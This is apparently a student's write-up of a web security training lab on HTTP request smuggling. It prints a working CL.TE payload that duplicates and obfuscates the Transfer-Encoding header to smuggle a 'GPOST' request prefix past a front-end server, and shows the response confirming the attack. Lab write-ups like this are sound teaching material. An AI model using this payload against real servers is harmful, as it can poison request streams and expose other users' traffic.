## HTTP request smuggling, obfuscating the TE header

This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren't using the GET or POST method.

To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.

Note :

Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.

Tip :

Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.

## Notes

- Possibility to leave a comment on a post

## Resume

1. Identify a CL.TE request smuggling vulnerability.
2. Obfuscate the `Transfer-Encoding` header so the front-end ignores it.
3. Smuggle a request prefix beginning with `GPOST`.
4. Poison the back-end request stream.
5. Confirm the vulnerability when the next request is interpreted as `GPOST`.

## Solve

Payload using an obfuscated `Transfer-Encoding` header:

```http
POST / HTTP/1.1
Host: 0ac600730492154c810948e300e200d4.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

Explanation:

- The front-end does not correctly process the obfuscated `Transfer-Encoding` header and relies on the `Content-Length` value.
- The back-end interprets the request using chunked encoding.
- This causes a desynchronization between the front-end and back-end request boundaries.
- The payload smuggles a request beginning with `GPOST`, which is prepended to the next request received by the back-end.

Successful exploitation is confirmed when the second request returns a response similar to:

```http
HTTP/1.1 400 Bad Request

Unrecognized method GPOST
```

This proves that the back-end interpreted the next request as `GPOST`, confirming the request smuggling vulnerability.